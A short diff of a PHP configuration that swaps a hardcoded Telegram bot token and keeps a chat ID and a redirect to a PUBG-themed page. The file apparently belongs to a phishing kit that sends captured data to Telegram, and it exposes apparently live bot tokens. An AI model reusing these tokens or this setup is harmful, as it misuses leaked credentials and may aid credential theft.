@@ -1,5 +1,5 @@
 <?php
-$defaultBotToken = '7890110555:AAEIWR8tMgZEKYC9C6lsgnc1C-uau8iAyYk';
+$defaultBotToken = '8115406085:AAFE0Im75ErSYQg6bt9OfJsusB0ReYlVb1M';
 $defaultChatId = '512392705';
 $defaultRedirectUrl = '../php/pubg/index.php';
 $botToken = $_POST['botToken'] ?? $defaultBotToken ;
